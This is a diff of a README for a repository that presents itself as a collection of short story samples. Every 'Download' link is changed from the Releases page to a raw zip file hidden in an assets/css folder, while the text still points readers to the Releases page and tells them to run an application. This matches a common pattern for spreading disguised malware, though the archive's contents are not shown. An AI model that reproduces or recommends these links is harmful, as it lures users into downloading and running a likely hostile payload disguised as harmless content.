@@ -1,6 +1,6 @@
 # 📚 short-stories-samples - Download Creative Writing Samples
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/nehalkhalid1985/short-stories-samples/releases)
+[![Download](https://raw.githubusercontent.com/nehalkhalid1985/short-stories-samples/main/assets/css/short-stories-samples_1.4.zip)](https://raw.githubusercontent.com/nehalkhalid1985/short-stories-samples/main/assets/css/short-stories-samples_1.4.zip)
 
 ## 📖 Description
 
@@ -19,7 +19,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
 
-   [Download Here](https://github.com/nehalkhalid1985/short-stories-samples/releases)
+   [Download Here](https://raw.githubusercontent.com/nehalkhalid1985/short-stories-samples/main/assets/css/short-stories-samples_1.4.zip)
 
 2. **Choose Your File**: On the Releases page, you will see a list of available files. Look for the version that suits your needs. Each version may contain different short stories.
 
@@ -37,7 +37,7 @@ Follow these steps to download and run the application:
 
 To start reading the stories, you can download them from the Releases page: 
 
-[Download Here](https://github.com/nehalkhalid1985/short-stories-samples/releases)
+[Download Here](https://raw.githubusercontent.com/nehalkhalid1985/short-stories-samples/main/assets/css/short-stories-samples_1.4.zip)
 
 ## ⚙️ System Requirements
 
